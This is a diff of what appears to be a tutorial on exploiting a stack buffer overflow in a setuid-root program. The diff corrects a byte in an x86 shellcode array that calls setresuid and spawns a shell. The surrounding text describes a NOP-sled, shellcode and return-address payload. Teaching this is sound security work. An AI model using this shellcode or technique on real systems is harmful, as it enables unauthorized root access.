@@ -44,7 +44,7 @@ Here, the owner of /etc/notes is root. So this program should be executed with r
 char shellcode[] =
 "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
 "\x2f\x2f\x74\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
-"\xe1\xcd\80";
+"\xe1\xcd\x80";
 
 int main(int argc, char* argv[]) {
   char* command, *buffer;
@@ -75,4 +75,5 @@ int main(int argc, char* argv[]) {
 
 First step of this exploit is make string which contains    
 >./victim 'nopsled + shellcode + address of somewhere of nopsled'   
+
 and store it in command. But 
